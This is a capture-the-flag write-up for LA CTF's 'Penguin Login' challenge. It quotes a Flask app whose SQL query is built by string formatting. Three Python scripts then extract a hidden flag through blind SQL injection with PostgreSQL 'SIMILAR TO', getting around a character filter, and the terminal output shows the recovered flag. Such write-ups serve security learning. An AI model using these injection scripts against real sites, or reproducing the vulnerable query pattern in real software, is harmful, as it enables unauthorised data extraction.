# Penguin Login

## Description
```
I got tired of people leaking my password from the db so I moved it out of the db. penguin.chall.lac.tf
```

## Provided Files
`penguin-login.zip`

## Writeup

First of all I took a look at the provided files. <br/>
Inside the only interesting one was `app.py`. <br/>
```py
allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")
forbidden_strs = ["like"]

with app.app_context():
    conn = get_database_connection()
    create_sql = """
        DROP TABLE IF EXISTS penguins;
        CREATE TABLE IF NOT EXISTS penguins (
            name TEXT
        )
    """
    with conn.cursor() as curr:
        curr.execute(create_sql)
        curr.execute("SELECT COUNT(*) FROM penguins")
        if curr.fetchall()[0][0] == 0:
            curr.execute("INSERT INTO penguins (name) VALUES ('peng')")
            curr.execute("INSERT INTO penguins (name) VALUES ('emperor')")
            curr.execute("INSERT INTO penguins (name) VALUES ('%s')" % (flag))
        conn.commit()

@app.post("/submit")
def submit_form():
    conn = None
    try:
        username = request.form["username"]
        conn = get_database_connection()

        assert all(c in allowed_chars for c in username), "no character for u uwu"
        assert all(
            forbidden not in username.lower() for forbidden in forbidden_strs
        ), "no word for u uwu"

        with conn.cursor() as curr:
            curr.execute("SELECT * FROM penguins WHERE name = '%s'" % username)
            result = curr.fetchall()

        if len(result):
            return "We found a penguin!!!!!", 200
        return "No penguins sadg", 201

    except Exception as e:
        return f"Error: {str(e)}", 400

    # need to commit to avoid connection going bad in case of error
    finally:
        if conn is not None:
            conn.commit()
```

These are the interesting parts of the code. <br/>
One important thing to notice in here is that we are actually not able to get the flag itself. <br/>
Seeing this my guess was that although we cannot obtain the whole flag, we can actually guess the flag using something similar to `regular expressions`. <br/>

To test my theory I made a little script in python. <br/>
```py
import requests, string

allowed_chars = set(string.ascii_letters + string.digits + " 'flag{a_word}'")

print(allowed_chars)

base_URL = 'https://penguin.chall.lac.tf/submit'

forms = {
    'username': "' or name similar to 'pe__"
}

req = requests.post(base_URL, data=forms) 

print(req.text)
```

Using this I checked if I could use the `SQL` operator `SIMILAR TO` together with `whitespaces` to guess the flag piece after piece. <br/>
For those interested I got this knowledge from https://www.atlassian.com/data/sql/how-regex-works-in-sql.

before the bruteforce I checked the length of the flag with the script below. <br/>
```py
import requests

base_URL = 'https://penguin.chall.lac.tf/submit'

actual_flag = 'lactf{'

for i in range(10, 50):

    forms = {
        'username': "' or name similar to 'lactf{" + "_" * i
    }

    req = requests.post(base_URL, data=forms) 

    if req.text != 'No penguins sadg':
        print(i)
        break
```

Executing this I got the length of `45` which includes prefix and braces. <br/>
Putting together another script I was able to bruteforce the flag. <br/>
```py
import requests

base_URL = 'https://penguin.chall.lac.tf/submit'

# possible chars from app.py
possible_chars = 'abcedfghijklmnopqrstuvwxyz0123456789}X'

actual_flag = 'lactf{'
flag = 'lactf_' # Use "_" instead of "{" because otherwise you create an error

flag_size = 45 # flag size enumerated before with only whitespaces

for _ in range(1, 40):
    # looping through all possible characters for every position in the flag
    for char in possible_chars:
        forms = { 'username': "' or name similar to '" + flag + char + "_" * (flag_size - len(flag) - 1) }

        req = requests.post(base_URL, data=forms) 

        # Check if correct character was found and skip to next position
        if req.text != 'No penguins sadg':
            actual_flag += char
            flag += char
            break

        # check if no character was found and insert "_"
        if char == 'X':
            actual_flag += "_"
            flag += "_"
            break

    print(actual_flag)
```

Executing this script I slowly obtained the flag which concludes this writeup. <br/>
```sh
kali@kali python3 ./req.py
lactf{9
lactf{90
lactf{90s
lactf{90st
lactf{90stg
lactf{90stgr
lactf{90stgr3
lactf{90stgr35
lactf{90stgr35_
lactf{90stgr35_3
lactf{90stgr35_3s
lactf{90stgr35_3s_
lactf{90stgr35_3s_n
lactf{90stgr35_3s_n0
lactf{90stgr35_3s_n0t
lactf{90stgr35_3s_n0t_
lactf{90stgr35_3s_n0t_l
lactf{90stgr35_3s_n0t_l7
lactf{90stgr35_3s_n0t_l7k
lactf{90stgr35_3s_n0t_l7k3
lactf{90stgr35_3s_n0t_l7k3_
lactf{90stgr35_3s_n0t_l7k3_t
lactf{90stgr35_3s_n0t_l7k3_th
lactf{90stgr35_3s_n0t_l7k3_th3
lactf{90stgr35_3s_n0t_l7k3_th3_
lactf{90stgr35_3s_n0t_l7k3_th3_0
lactf{90stgr35_3s_n0t_l7k3_th3_0t
lactf{90stgr35_3s_n0t_l7k3_th3_0th
lactf{90stgr35_3s_n0t_l7k3_th3_0th3
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_d
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_db
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0
lactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}
```